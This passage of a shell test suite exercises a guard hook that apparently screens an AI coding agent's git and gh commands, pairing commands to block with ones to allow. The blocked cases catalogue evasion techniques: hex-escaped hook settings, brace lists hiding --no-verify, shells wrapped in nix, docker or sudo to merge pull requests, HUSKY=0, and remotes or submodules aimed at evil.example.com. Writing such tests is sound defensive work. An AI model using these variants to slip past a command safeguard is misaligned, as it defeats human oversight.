    block "git -c \$'core.hooksP\\x61th=/dev/null' commit -m x" 'core.hooksP'
    block "git config \$'core.hooksP\\x61th' /dev/null" 'git config'
    block "git commit {--no-verify,'-m x'}" 'brace list'
    block 'git commit {--no-verify,-m\ x}' 'brace list'
    block 'git commit {--no-verify,"-m x"}' 'brace list'
    block 'git remote "$v" origin https://example.com/x.git' 'expansion'
    allow 'git commit -m"$msg"'
    allow 'git commit --message="$msg" "$file"'
    allow 'git commit -m x "$@"'
    allow "git commit -m \$'line one\\nline two'"
    allow 'git stash apply stash@{0}'
}

case_config_flags_end_at_the_first_key() {
    block 'git config core.hooksPath /dev/null --get' 'core.hooksPath'
    block 'git config -- core.hooksPath --list' 'core.hooksPath'
    block 'git config --uns core.hooksPath' 'core.hooksPath'
    block 'git config --typ bool core.hooksPath true' 'core.hooksPath'
    block 'git config -zt bool core.hooksPath true' 'core.hooksPath'
    block 'git config --remove-section remote.origin' 'remote.origin'
    block 'git config --rem core' 'git config'
    block 'git config --rename-section remote.origin remote.up' 'remote.origin'
    block 'git config --rename-section scratch.x branch.main' 'git config'
    block 'git config remove-section commit' 'git config'
    block "git -C $SCRATCH config --global --remove-section user" 'outside the repository'
    block "git -C $SCRATCH config --global --edit" 'outside the repository'
    allow 'git config --get core.hooksPath'
    allow 'git config get user.name'
    allow 'git config --remove-section branch.feature'
    allow "git -C $SCRATCH config --remove-section core"
}

case_a_shell_behind_another_command_is_read() {
    block "nix develop -c bash -c 'git commit --no-verify -m x'" 'as text to run'
    block "nix develop -c sh -c 'gh pr merge 5'" 'as text to run'
    block "direnv exec . bash -c 'gh pr merge 5'" 'as text to run'
    block "mise exec -- bash -c 'gh pr merge 5'" 'as text to run'
    block "uv run bash -c 'gh pr merge 5'" 'as text to run'
    block "retry 3 bash -c '/opt/homebrew/bin/gh pr merge 5'" 'as text to run'
    block "\"\$SHELL\" -c 'gh pr merge 5'" 'command word the shell computes'
    block "\$SHELL -lc 'gh pr merge 5'" 'command word the shell computes'
    block $'nix develop -c bash <<EOF\ngh pr merge 5\nEOF' 'standard input'
    # The name behind a path, in text and as a word.
    block "bash -c '/opt/homebrew/bin/gh pr merge 5'" 'as text to run'
    block "sh -c 'cd x && /usr/bin/git commit --no-verify -m x'" 'as text to run'
    block "eval '/opt/homebrew/bin/gh pr merge 5'" 'as text to run'
    block 'find . -name x -exec /opt/homebrew/bin/gh pr merge 5 \;' 'as text to run'
    block "git rebase -x '/opt/homebrew/bin/gh pr merge 5' HEAD~1" 'exec'
    block 'git bisect run /opt/homebrew/bin/gh pr merge 5' 'handed a git or gh command'
    block "git submodule foreach '/usr/bin/git push origin main'" 'handed a git or gh command'
    block "git -c core.editor='/opt/homebrew/bin/gh pr merge 5 #' commit --amend" 'holds a git or gh command'
    block "GIT_EDITOR='/opt/homebrew/bin/gh pr merge 5 #' git commit --amend" 'holds a git or gh command'
    # zsh runs a command written straight after a test or a group.
    block 'if [[ -n $x ]] { gh pr merge 5 }' 'bare'
    block 'if [[ -n $x ]] { gh pr merge 5; }' 'merging a pull request'
    block 'if [[ -n $x ]] gh pr merge 5' 'merging a pull request'
    block '{ true } always { gh pr merge 5 }' 'bare'
    block '{ true } always { gh pr merge 5; }' 'merging a pull request'
    block 'if true { gh pr merge 5 }' 'bare'
    block 'if true { gh pr merge 5; }' 'merging a pull request'
    block 'while true { gh pr merge 5 }' 'bare'
    # A stored command, and a scratch verdict behind an unknown command.
    block 'set -- gh pr merge 5; "$@"' 'merging a pull request'
    block "foo git -C $SCRATCH commit --no-verify -m x" 'no-verify'
    block "set -a; printf -v\"\${P}DIR\" %s $PROJ/.git; git -C $SCRATCH commit --no-verify -m x" 'no-verify'
    block 'gh api -X PUT repos/acme/app/contents/x -F branch=main -f branch=feature -f message=m -f content=Yg==' 'given twice'
    allow "git status && docker run --rm ubuntu bash -c 'apt-get install -y git curl'"
    allow 'brew install bash && git status'
    allow 'git status; find ~/.config/gh -name hosts.yml'
    allow 'if [[ -n $x ]]; then git status; fi'
    allow '{ git status; git diff; } > out.txt'
    allow 'set -euo pipefail; git status'
    allow "\"\$PY\" -c 'print(1)'; git status"
}

case_a_word_the_shells_read_differently_is_refused() {
    # A bare `{`, `}` or `]]` ends the command in zsh and is an argument in
    # bash, so the words after it would be read by one shell only.
    block 'git commit -m { --no-verify' 'bare'
    block 'git commit -m x { -n' 'bare'
    block 'git merge -m ]] --no-verify topic' 'bare'
    block 'git tag -m { --no-sign v1' 'bare'
    block 'git config core.hooksPath {' 'bare'
    block 'gh auth status --hostname { --show-token' 'bare'
    allow '{ git status; } 2>&1 | head'
    allow 'git status && { echo ok; }'
    allow 'git diff --quiet || { echo dirty; exit 1; }'
    allow "git commit -m 'close } and ]] and {'"
    # `git pull -j` takes no next word, so the word after it is a flag.
    block 'git pull -j --no-verify origin feature; echo done' 'no-verify'
    block 'git pull --jobs --no-gpg-sign origin feature; echo done' 'no-gpg-sign'
    block 'git pull -j --no-gpg-sign origin feature' 'no-gpg-sign'
    # A cluster that ends in a value flag takes the next word.
    allow 'git commit -am "$v-renamed"'
    allow "git commit -am \$'\\n--no-verify text'"
    block 'git commit -an -m x' 'no-verify'
    # A flag an expansion could complete.
    block 'git commit -a"$x" -m y' 'built from an expansion'
    block 'git commit "$d"-no-verify -m x' 'built from an expansion'
    block "git commit \$'--no-\\x76erify' -m y" 'built from an expansion'
    block "git commit \$'-\\x6e' -m y" 'built from an expansion'
    allow 'git commit -S"$KEY" -m x'
    allow 'git merge -m"$msg" feat'
    allow 'git rebase -i HEAD~"$n"'
    # A brace list with a substitution in it.
    block 'git commit {--no-verify,$(echo -m)} x' 'brace list'
    block "git commit {--no-verify,\$'a b'} x" 'brace list'
    block 'git commit {--no-verify,${x:-a b}}'
    # `git config` flags git reads another way.
    block 'git config --fix core.hooksPath /dev/null zzz' 'core.hooksPath'
    block "git config --file $SCRATCH/x --no-file core.hooksPath /dev/null" 'core.hooksPath'
    allow 'git config --fixed-value --get user.name x'
    # Text behind a runner, and what is prose behind another command.
    block "nix develop -c \"\$SHELL\" -lc 'gh pr merge 5'" 'as text to run'
    block "nix-shell --run 'gh pr merge 5'" 'as text to run'
    block "devbox run 'gh pr merge 5'" 'as text to run'
    block "nix develop -c bash -c '\\gh pr merge 5'" 'as text to run'
    block 'nix run nixpkgs#gh -- pr merge 5'
    allow 'brew install bash 2>&1 | tail -3 && git --version'
    allow 'shellcheck x.sh -s sh | head -20 && git add x.sh'
    allow 'pgrep -fl zsh | head; git status'
    allow "ag bash 'git push'; git status"
    allow 'python3 gen.py --shell bash --cmd "git status"'
    allow "bash -c 'cd ~/code/git && make'"
    allow "bash -c 'ls ~/.config/gh hosts.yml'"
}

case_text_with_an_expansion_or_a_newline_is_still_read() {
    # Double-quoted text with an expansion in it, behind another command.
    block 'nix develop -c bash -c "gh pr merge $PR"' 'as text to run'
    block 'nix develop -c bash -c "git push origin $b:main"' 'as text to run'
    block "nix develop -c bash -c \"git commit -n -m '\$msg'\"" 'as text to run'
    block 'docker exec c sh -c "gh pr merge $PR"' 'as text to run'
    block "docker exec c sh -c \"cd /app && git commit --no-verify -m '\$m'\"" 'as text to run'
    block 'docker run --rm img sh -c "gh pr merge $PR"' 'as text to run'
    block 'ssh host bash -c "gh pr merge $n"' 'as text to run'
    block 'uv run sh -c "gh pr merge $n"' 'as text to run'
    block 'direnv exec . sh -c "gh pr merge $n"' 'as text to run'
    block 'nix-shell --run "gh pr merge $PR"' 'as text to run'
    block 'devbox run "gh pr merge $PR"' 'as text to run'
    block '"$SHELL" -c "gh pr merge $n"' 'command word the shell computes'
    block "cmd='gh pr merge 5'; nix develop -c bash -c \"\$cmd\"" 'stores a git or gh command'
    # Text that spans lines.
    block $'"$SHELL" -c \'set -e\ngh pr merge 5\'' 'command word the shell computes'
    block $'nix develop -c bash -c \'set -e\ngh pr merge 5\'' 'as text to run'
    block $'docker exec c sh -c \'\ncd /app\ngit commit --no-verify -m x\n\'' 'as text to run'
    block $'ssh host bash -c \'cd repo\ngh pr merge 5\'' 'as text to run'
    block $'nix-shell --run \'set -e\ngh pr merge 5\'' 'as text to run'
    # The line break written as an escape.
    block "bash -c \$'set -e\\ngh pr merge 5'" 'as text to run'
    block "sh -c \$'cd repo;\\ngh pr merge 5'" 'as text to run'
    block "docker exec c sh -c \$'cd /app\\ngit push origin main'" 'as text to run'
    block "\"\$SHELL\" -c \$'set -e\\ngh pr merge 5'" 'command word the shell computes'
    block "nix develop -c bash -c \$'set -e\\ngh pr merge 5'" 'as text to run'
    # The text joined to its flag.
    block 'doppler run --command="gh pr merge 5"' 'as text to run'
    block 'su -c"gh pr merge 5" user' 'as text to run'
    # A stored command reaches a runner; a looked-up name does not.
    block "c='gh pr merge 5'; docker exec x sh -c \"\$c\"" 'stores a git or gh command'
    block "cmd='gh pr merge 5'; devbox run \"\$cmd\"" 'stores a git or gh command'
    block 'for t in git gh; do nix develop -c bash -c "$t --version"; done' 'stores a git or gh command'
    # A looked-up, loop-held, default-held or array-held name with one of
    # its subcommands after it.
    block 'doppler run -- $(which gh) pr merge 5' 'stores a git or gh command'
    block 'nix develop -c "$(which gh)" pr merge 5' 'stores a git or gh command'
    block 'G=$(which gh); doppler run -- "$G" pr merge 5' 'stores a git or gh command'
    block 'GIT=$(command -v git); nix develop -c "$GIT" commit --no-verify -m x' 'stores a git or gh command'
    block 'GIT=$(command -v git); nix develop -c "$GIT" push origin main' 'stores a git or gh command'
    block 'nix develop -c ${GH:-gh} pr merge 5' 'stores a git or gh command'
    block 'op run -- ${GH_BIN:-gh} pr merge 5'
    block 'for g in gh; do doppler run -- $g pr merge 5; done' 'stores a git or gh command'
    block 'for g in git; do nix develop -c $g push origin main; done' 'stores a git or gh command'
    block 'g=(gh); nix develop -c "${g[@]}" pr merge 5' 'stores a git or gh command'
    block 'for g in gh; do su -c "$g pr merge 5" user; done' 'stores a git or gh command'
    block 'for g in gh; do nix-shell --run "$g pr merge 5"; done' 'stores a git or gh command'
    block 'for g in gh; do devbox run "$g pr merge 5"; done' 'stores a git or gh command'
    block 'for g in git; do nix develop -c $g --no-pager push origin main; done' 'stores a git or gh command'
    allow 'which gh && nix develop -c cargo test "$FILTER" -- --nocapture'
    # Either reading of the text counts.
    block 'nix develop -c bash -c "gh p$R merge 5"' 'as text to run'
    block "nix develop -c bash -c 'git \\rebase --no-verify main'" 'as text to run'
    block "\"\$SHELL\" -c 'gh \\repo delete x'" 'command word the shell computes'
    allow 'for t in git gh jq; do command -v $t; done; nix develop -c cargo test "$T"'
    allow 'which gh && nix develop -c cargo test "$FILTER"'
    allow 'type gh >/dev/null && devbox run test "$name"'
    allow 'which git; kubectl exec pod -c app -- ./x "$REV"'
    # An expansion after the name, made by this call or by the inner shell.
    block 'bash -c "/opt/homebrew/bin/gh $sub merge 5"' 'as text to run'
    block "bash -c '/opt/homebrew/bin/gh \$sub merge 5'" 'as text to run'
    block "bash -c '/usr/bin/git \"\$@\"' _ push origin main" 'as text to run'
    block "bash -c 'exec /opt/homebrew/bin/gh \"\$@\"' _ pr merge 5" 'as text to run'
    block "\"\$SHELL\" -c 'gh \$s merge 5'" 'command word the shell computes'
    block "nix develop -c bash -c 'gh \$sub 5'" 'as text to run'
    # The flag that takes text: `-c`, a cluster ending in it, or a cluster
    # holding it behind a shell.
    block "docker exec c sh -ce 'gh pr merge 5'" 'as text to run'
    block "su -lc 'gh pr merge 5' user" 'as text to run'
    allow 'go test -race -run "git status" ./...'
    allow 'cargo test -- --exact "git status"'
    # A name that starts with an expansion is not a flag.
    allow 'git tag "${VERSION}-rc1"'
    allow 'git merge "${BRANCH}-fix"'
    allow 'git rebase "${base}-backup"'
    allow 'git commit -m x "$dir"-file.rs'
    block 'git commit "$d"--no-verify -m x' 'built from an expansion'
    block 'git commit "$d"-n -m x' 'built from an expansion'
    block 'git tag "$pkg-$ver"' 'built from an expansion'
    # A prefix git completes, a hook switch on another verb, and a shell
    # that prints and exits.
    block 'git tag --no-si v1' 'no-gpg-sign'
    block 'git send-email --no-validate x.patch' 'sendemail-validate'
    block 'git -c sendemail.validate=false send-email x.patch' 'sendemail.validate'
    block 'git tag "$y-$m-$d"' 'built from an expansion'
    allow 'git commit --no-si -m x'
    allow 'zsh --version; git --version'
    allow 'bash --version && git --version'
}

case_organization_access_writes_are_denied() {
    block 'gh api -X PATCH orgs/acme -f default_repository_permission=admin' 'organization'
    block 'gh api -X PUT orgs/acme/organization-roles/users/someone/1' 'organization'
    block 'gh api -X PUT orgs/acme/security-managers/teams/x' 'organization'
    block 'gh api -X POST orgs/acme/personal-access-token-requests/1 -f action=approve' 'organization'
    block 'gh api -X PATCH "orgs/$O" -f default_repository_permission=admin' 'could spell'
    block 'gh api -X PATCH enterprises/acme/x -f a=b'
    allow 'gh api orgs/acme/members'
    allow 'gh api -X POST orgs/acme/repos -f name=x'
    allow 'gh api -X PUT orgs/acme/actions/secrets/FOO -f encrypted_value=x -f key_id=y'
    allow 'git fetch --depth 1 origin'
    allow 'git fetch -j4 origin'
}

# ---- a wrapper flag that takes a value hides no shell ------------------------------

case_a_valued_wrapper_flag_hides_no_shell() {
    block "gh pr list --json number -q '.[].number' | xargs -I {} sh -c 'gh pr merge {} --squash'" 'as text'
    block "xargs -I {} bash -c 'gh pr merge {} --squash' < prs.txt" 'as text'
    block "xargs -I N zsh -c 'gh pr merge N --squash'" 'as text'
    block "timeout -s KILL 60 bash -c 'gh pr merge 5 --squash'" 'as text'
    block "timeout --signal KILL 60 bash -c 'git push origin main'" 'as text'
    block "env -u FOO bash -c 'gh pr merge 5 --squash'" 'as text'
    block "env -C /tmp bash -c 'gh pr merge 5 --squash'" 'as text'
    block "sudo -u me bash -c 'gh pr merge 5 --squash'" 'as text'
    block 'xargs -I {} gh pr merge {} --squash' 'gh pr merge'
    allow 'git ls-files | xargs -I {} echo {}'
    allow 'env -u FOO find . -name "*.git"'
    allow 'timeout -s KILL 60 cargo test -- git'
    block "xargs -I {} bash -lc 'git push origin main'" 'as text'
    block "env -u FOO nohup sh -c 'gh pr merge 5'" 'as text'
    block "sudo -u me -g staff bash -c 'gh pr merge 5 --squash'" 'as text'
    block 'sudo -u me git -C . send-pack origin HEAD:main' 'send-pack'
    block 'timeout -s KILL 60 git -c credential.helper= credential fill' 'credential'
    block 'env -u FOO git send-pack origin HEAD:main' 'send-pack'
    # A wrapped command whose own arguments name a shell or `.` is not one.
    allow 'git status && time go build .'
    allow 'timeout 120 docker build -t "app:$(git rev-parse --short HEAD)" .'
    allow "cd $PROJECT && env CGO_ENABLED=0 go build -o bin/app ."
    allow 'git stash push -m x && time cargo install --path . && git stash list'
    allow 'git add -A && time nix build . && git commit -m x'
    allow 'git status && time pip install -e .'
    allow 'git status && command pip install .'
    allow 'git status && timeout 300 pytest .'
    allow 'git status && time rsync -a src/ .'
    allow 'git status && time tar -xzf a.tgz -C .'
    allow 'gh pr view 5 && time go vet .'
    allow 'git log -1 && time docker run --rm ubuntu bash'
    allow 'git status && time docker exec -it c bash'
    allow 'git status && time kubectl exec -it pod -- sh'
    allow 'git status && timeout 60 nix develop -c bash'
    allow 'git status && time ssh host bash'
    allow 'git status; sudo apt-get install -y git zsh'
    allow 'git status; sudo apt-get install -y parallel git'
    allow 'git status && time brew install bash'
    allow "git status && time docker run --rm ubuntu bash -c 'apt-get update && apt-get install -y git'"
    block 'git status; sudo -u postgres bash' 'standard input'
    block "echo 'gh pr merge 5' | timeout -s KILL 60 bash" 'standard input'
    block "env -u FOO bash <<<'gh pr merge 5'" 'standard input'
    block "cmd='gh pr merge 5'; sudo -u me -E \$cmd" 'by name'
    block "cmd='gh pr merge 5'; env -u FOO -i \$cmd" 'by name'
}

# ---- gh's short subcommand names run the long name's checks ------------------------

case_gh_short_names_get_the_long_names_checks() {
    block 'gh repo new acme/new --private --source . --push' '--push'
    block 'gh repo new acme/new --source=. --push' '--push'
    block 'gh pr new --title t --body b' '--head'
    block 'gh pr new --fill' '--head'
    block 'gh pr co 5 --recurse-submodules' 'recurse-submodules'
    allow 'gh pr new --head feat-x --title t --body b'
    allow 'gh alias ls'
    allow 'gh ssh-key ls'
    allow 'gh extension ls'
    allow 'gh config ls'
    allow 'gh repo deploy-key ls'
    allow 'gh pr ls'
    block 'gh repo deploy-key new key.pub' 'deploy key'
}

# ---- a public or irreversible gh command runs alone --------------------------------

case_a_public_gh_command_runs_alone() {
    block 'gh release create v1 --notes x | tail -1' 'its own Bash call'
    block 'cd . && gh gist create f.txt' 'its own Bash call'
    block 'git status && gh gist new f.txt' 'its own Bash call'
    block 'gh release new v1 --notes "$(cat notes.md)"' 'its own Bash call'
    block 'gh repo delete acme/old --yes; echo done' 'its own Bash call'
    block 'gh release upload v1 a.tgz && gh release view v1' 'its own Bash call'
    block 'gh repo fork acme/widgets --clone | cat' 'its own Bash call'
    block 'env gh repo delete acme/old --yes' 'starts with'
    block 'timeout 60 gh repo delete acme/old --yes' 'starts with'
    block 'GH_PROMPT_DISABLED=1 gh repo create acme/new --private' 'starts with'
    block '/opt/homebrew/bin/gh gist create f.txt' 'starts with'
    allow 'gh gist create f.txt'
    allow 'gh gist new f.txt'
    allow 'gh release create v1 --notes-file notes.md'
    allow 'gh release upload v1 a.tgz 2>&1'
    allow 'gh repo delete acme/old --yes'
    allow 'gh release view v1 | head'
    allow 'gh gist list | head'
}

# ---- a name beside a flag, a lookup and a directory are not the program -------------

case_a_mention_beside_a_flag_is_not_a_command() {
    allow 'tree ~/.config/gh -L 2'
    allow 'eza ~/.config/git --tree'
    allow 'fd . ~/.config/gh -e yml'
    allow 'tar -C ~/.config/git -czf x.tgz .'
    allow "egrep -r git --include='*.md' ."
    allow 'ag -l git --rust'
    allow 'pgrep git -l'
    allow 'brew info gh --json'
    allow 'sudo apt-get install git -y'
    block 'fd -x git -C d push origin main' 'git push'
    block 'fd . -x gh -R acme/widgets pr merge 5' 'gh blocked'
    allow 'command -v git gh jq'
    allow 'command -V gh'
    allow 'for t in git gh jq; do command -v "$t" >/dev/null || echo "missing $t"; done'
    allow 'tools="git gh jq"; for t in $tools; do command -v $t; done'
    allow 'tools=(git gh jq); echo "${tools[@]}"'
    allow 'tools=(git gh jq); for t in "${tools[@]}"; do command -v "$t"; done'
    block 'c=(gh pr merge 5 --squash); "${c[@]}"' 'gh pr merge'
    block 'cmd=(gh pr merge 5); timeout -s KILL 60 "${cmd[@]}"' 'gh pr merge'
    block 'cmd=(gh pr merge 5); retry 3 "${cmd[@]}"' 'gh pr merge'
    block 'local cmd=(git push origin main)' 'git push'
    block 'c=(gh pr); "${c[@]}" merge 5' 'by name'
    block 'c=(gh pr view); xargs -I {} "${c[@]}" {}' 'by name'
    allow 'cmd=(gh pr view 5); retry 3 "${cmd[@]}"'
    block 'echo x=(gh pr merge 5)' 'gh pr merge'
    block 'command gh pr merge 5 --squash' 'gh pr merge'
    block 'command -p gh pr merge 5 --squash' 'gh pr merge'
    allow 'hash git gh jq'
    block 'hash -p /opt/homebrew/bin/gh g; g pr merge 5' 'second name'
    mkdir -p "$PROJECT/cfg/gh"
    allow 'cp -r cfg/gh backup'
    allow "cp -r $PROJECT/cfg/gh $WORK/backup"
    block 'cp /opt/homebrew/bin/gh ./g' 'second name'
    rm -rf "$PROJECT/cfg"
}

# ---- a hook manager's off switch is a hook skip ------------------------------------

case_a_hook_manager_switch_is_a_hook_skip() {
    block 'HUSKY=0 git commit -m x' 'hook manager'
    block 'HUSKY_SKIP_HOOKS=1 git commit -m x' 'hook manager'
    block 'LEFTHOOK=0 git commit -m x' 'hook manager'
    block 'export HUSKY=0; git commit -m x' 'hook manager'
    block 'env LEFTHOOK=0 git rebase main' 'hook manager'
    allow 'HUSKY=0 npm install'
    allow 'export HUSKY=0; git status'
}

# ---- git verbs that leave the sandbox for config, worktrees or SSH ----------------

OUTSIDE=/opt/guard-test         # neither the project nor a scratch root
SCRATCHY=/tmp/claude-guard-test # a Claude scratch root on every platform

case_pull_outside_the_sandbox() {
    local cur
    allow 'git pull'
    allow 'git pull origin'
    allow 'git pull origin feat'
    allow 'git pull --rebase origin feat'
    allow 'git pull --ff-only --no-edit origin feat 2>&1'
    allow 'git pull -h'
    block 'git pull -s evil origin feat' 'allowlist'
    block 'git pull --upload-pack=evil origin' 'allowlist'
    block 'git pull --rebase=interactive origin feat' 'allowlist'
    block 'git pull -e origin feat' 'allowlist'
    block 'git pull --recurse-submodules origin feat' 'allowlist'
    block 'git pull --no-verify origin feat' 'skips'
    block 'git pull --no-gpg-sign origin feat' 'signature'
    block 'git pull ../other' 'not a configured remote'
    block 'git pull https://github.com/acme/widgets.git main' 'not a configured remote'
    block 'git pull origin "$B"' 'plain literal'
    block 'git -C ../other pull' 'git option before the subcommand'
    block 'HUSKY=0 git pull origin feat' 'environment assignment'
    block 'gh pr view 5 && git pull origin feat' 'own Bash call'
    block 'git pull origin feat > out.txt' 'redirection'
    # A help flag with a redirect is not the bare usage print.
    block 'git pull -h > out.txt' 'redirection'
    allow 'git pull -h 2>&1'
    block 'git -c help.format=web pull --help' 'git option before the subcommand'
    block 'git clone --help 2> err.txt' 'redirection'
    block 'git worktree add -h >> out.txt' 'redirection'
    # `--help` right after the verb becomes `git help <verb>`, which runs
    # the viewer the config names, so only `-h` is the usage print.
    block 'git pull --help' 'allowlist'
    block 'export GIT_SSH_COMMAND=evil; git pull -h'
    # `>&word` writes a file unless the word is a descriptor.
    block 'git pull -h >&out.txt' 'redirection'
    block 'git pull -h 2>&out.txt' 'redirection'
    block 'git pull -h &>out.txt' 'redirection'
    block 'git pull origin feat >&out.txt' 'redirection'
    block 'git push origin feat 2>&out.txt' 'redirection'
    block 'git worktree add -h >&out.txt' 'redirection'
    allow 'git worktree add -h 2>&1'
    allow 'git pull origin feat 2>&1 >/dev/null'
    # Beside a command that pins the call it stays sandboxed.
    allow 'cd ../other && git pull'
    allow 'ls && git pull ../other'

    : >"$PROJ/.git/hooks/commit-msg"
    block 'git pull origin feat' 'commit-msg'
    allow 'git fetch origin'
    rm -f "$PROJ/.git/hooks/commit-msg"

    printf '[submodule "x"]\n\tpath = x\n\turl = https://example.com/x\n' >"$PROJ/.gitmodules"
    block 'git pull origin feat' 'submodules'
    allow 'git pull --no-recurse-submodules origin feat'
    rm -f "$PROJ/.gitmodules"

    # A pull or fetch with no remote uses the one the branch tracks.
    cur=$(git -C "$PROJ" symbolic-ref --short HEAD)
    git -C "$PROJ" config "branch.$cur.remote" ../other
    block 'git pull' 'not a configured remote'
    block 'git fetch' 'not a configured remote'
    git -C "$PROJ" config "branch.$cur.remote" origin
    allow 'git pull'
    allow 'git fetch'
    git -C "$PROJ" config --unset "branch.$cur.remote"

    # With no upstream git fetches `origin` first, so a pull that names no
    # remote answers for every remote.
    git -C "$PROJ" remote add local "$WORK/nowhere.git"
    block 'git pull' 'not a github.com repository'
    block 'git pull --rebase' 'not a github.com repository'
    allow 'git pull origin feat'
    git -C "$PROJ" remote remove local

    # A remote defined by a legacy file is read by git and not by this hook.
    mkdir -p "$PROJ/.git/remotes"
    printf 'URL: ssh://git@evil.example.com/x.git\n' >"$PROJ/.git/remotes/legacy"
    block 'git pull origin feat' 'legacy remote'
    block 'git fetch origin' 'legacy remote'
    block 'git push origin feat' 'legacy remote'
    rm -rf "$PROJ/.git/remotes"
    allow 'git fetch origin'
    # Git accepts a dot-named file as a remote name, and reads `branches` too.
    mkdir -p "$PROJ/.git/remotes"
    printf 'URL: git@github.com:acme/widgets.git\nPush: refs/heads/feat:refs/heads/main\n' >"$PROJ/.git/remotes/.x"
    block 'git push .x feat' 'legacy remote'
    block 'git push origin feat' 'legacy remote'
    rm -rf "$PROJ/.git/remotes"
    mkdir -p "$PROJ/.git/branches"
    allow 'git push origin feat'
    printf 'git@github.com:acme/widgets.git#main\n' >"$PROJ/.git/branches/x"
    block 'git push origin feat' 'legacy remote'
    block 'git fetch origin' 'legacy remote'
    rm -rf "$PROJ/.git/branches"
    allow 'git push origin feat'

    # A `remotes` directory that is a symbolic link or cannot be listed is
    # refused: git opens a legacy file by name.
    mkdir -p "$WORK/elsewhere"
    ln -s "$WORK/elsewhere" "$PROJ/.git/remotes"
    block 'git fetch origin' 'legacy remote'
    rm -f "$PROJ/.git/remotes"
    if [ "$(id -u)" != 0 ]; then
        mkdir -p "$PROJ/.git/remotes"
        printf 'URL: ssh://git@evil.example.com/x.git\n' >"$PROJ/.git/remotes/up"
        chmod 100 "$PROJ/.git/remotes"
        block 'git fetch' 'legacy remote'
        block 'git pull' 'legacy remote'
        chmod 700 "$PROJ/.git/remotes"
        rm -rf "$PROJ/.git/remotes"
    fi
    allow 'git fetch origin'
    # A clone made with --recurse-submodules leaves `submodule.active`.
    git -C "$PROJ" config submodule.active .
    allow 'git push origin feat'
    git -C "$PROJ" config --unset submodule.active

    # An index gitlink alone means submodules.
    git -C "$PROJ" update-index --add --cacheinfo 160000,4b825dc642cb6eb9a060e54bf8d69288fbee4904,lib
    block 'git fetch origin' 'submodules'
    allow 'git fetch --no-recurse-submodules origin'
    git -C "$PROJ" update-index --force-remove lib
    allow 'git fetch origin'

    # Git reads `.gitmodules` from the index when the file is gone, and
    # fetches a submodule whose git directory exists under `modules`.
    printf '[submodule "x"]\n\tpath = x\n\turl = ssh://git@evil.example.com/x.git\n' >"$PROJ/.gitmodules"
    git -C "$PROJ" add .gitmodules
    rm -f "$PROJ/.gitmodules"
    block 'git pull origin feat' 'submodules'
    block 'git fetch origin' 'submodules'
    block 'git remote update' 'submodules'
    block 'git submodule update --init' 'not a github.com repository'
    block 'git submodule init' 'not a github.com repository'
    allow 'git fetch --no-recurse-submodules origin'
    git -C "$PROJ" rm -q --cached .gitmodules
    allow 'git fetch origin'
    mkdir -p "$PROJ/.git/modules/x"
    block 'git fetch origin' 'submodules'
    block 'git pull origin feat' 'submodules'
    rm -rf "$PROJ/.git/modules"
    allow 'git fetch origin'
}

case_clone_outside_the_sandbox() {
    allow 'git clone git@github.com:acme/widgets.git'
    allow 'git clone https://github.com/acme/widgets.git vendor/widgets'
    allow "git clone --depth 1 git@github.com:acme/widgets.git $SCRATCHY/w"
    allow 'git clone --bare -q git@github.com:acme/widgets.git'
    allow 'git clone git@github.com:acme/widgets.git .claude/worktrees/w'
    allow 'git clone -- git@github.com:acme/widgets.git w'
    allow 'git clone -h'
    block 'git clone --help' 'allowlist'
    block "git clone git@github.com:acme/widgets.git $OUTSIDE/w" 'outside this session'
    block 'git clone git@github.com:acme/widgets.git .claude/skills/x' '.claude'
    block 'git clone git@github.com:acme/widgets.git .git/x' '.git'
    block 'git clone git@github.com:acme/widgets.git a/../../x' '..'
    # The volume may fold case, so the reserved names are read in any case.
    block 'git clone git@github.com:acme/widgets.git .Claude' '.claude'
    block 'git clone git@github.com:acme/widgets.git .Claude/skills/x' '.claude'
    block 'git clone git@github.com:acme/widgets.git .GIT/hooks/x' '.git'
    block 'git clone git@github.com:acme/.Claude' '.claude'
    block 'git clone git@github.com:acme/widgets.git "w w"' 'characters outside'
    block $'git clone git@github.com:acme/widgets.git caf\303\251' 'characters outside'
    block 'git clone git@github.com:acme/widgets.git x/.claude/worktrees/.GIT' '.git'
    block 'git clone -c core.sshCommand=evil git@github.com:acme/widgets.git' 'allowlist'
    block 'git clone --upload-pack=evil git@github.com:acme/widgets.git' 'allowlist'
    block 'git clone --recurse-submodules git@github.com:acme/widgets.git' 'allowlist'
    block 'git clone --template=/tmp/t git@github.com:acme/widgets.git' 'allowlist'
    block 'git clone --separate-git-dir=/tmp/g git@github.com:acme/widgets.git' 'allowlist'
    block "git clone $OTHER copy" 'not a github.com repository'
    block 'git clone ext::sh copy' 'not a github.com repository'
    block 'git clone git@evil.example.com:a/b.git' 'not a github.com repository'
    block 'git clone git@github.com:acme/widgets.git "$D"' 'plain literal'
    block 'git clone git@github.com:acme/widgets.git a b' 'one repository URL'
    block 'gh pr view 5 && git clone git@github.com:acme/widgets.git' 'own Bash call'
    # A local clone stays sandboxed beside `cd`.
    allow "cd $WORK && git clone $OTHER copy"

    allow 'gh repo clone acme/widgets'
    allow "gh repo clone acme/widgets $SCRATCHY/w"
    allow 'gh repo clone acme/widgets vendor/w -- --depth=1'
    block "gh repo clone acme/widgets $OUTSIDE/w" 'outside this session'
    block 'gh repo clone acme/widgets .claude/skills/x' '.claude'
    block 'gh repo clone acme/widgets .Claude' '.claude'
    block 'gh repo clone acme/widgets "$D"' 'plain literal'
    allow "ls && gh repo clone acme/widgets $OUTSIDE/w"
}

case_remote_update_outside_the_sandbox() {
    allow 'git remote update'
    allow 'git remote update --prune'
    allow 'git remote update origin'
    allow 'git remote prune origin'
    allow 'git remote prune -n origin'
    block 'git remote update grp' 'not a configured remote'
    block 'git remote prune' 'name the remote'
    block 'git remote update --foo' 'allowlist'
    block 'git remote update "$R"' 'plain literal'
    printf '[submodule "x"]\n\tpath = x\n\turl = https://example.com/x\n' >"$PROJ/.gitmodules"
    block 'git remote update' 'submodules'
    allow 'git remote prune origin'
    rm -f "$PROJ/.gitmodules"
    git -C "$PROJ" remote add local "$WORK/nowhere.git"
    block 'git remote update' 'not a github.com repository'
    allow 'git remote update origin'
    git -C "$PROJ" remote remove local
    allow 'git remote -v'
    allow 'git remote show origin'
}

case_branch_upstream_outside_the_sandbox() {
    allow 'git branch -u origin/feat'
    allow 'git branch -u origin/feat feat'
    allow 'git branch --set-upstream-to=origin/feat feat'
    allow 'git branch --set-upstream-to origin/feat'
    allow 'git branch --unset-upstream'
    allow 'git branch -q --unset-upstream feat'
    block 'git branch -u origin/feat -D other' 'upstream flag'
    block 'git branch -D other -u origin/feat' 'upstream flag'
    block 'git branch -u "$U"' 'plain literal'
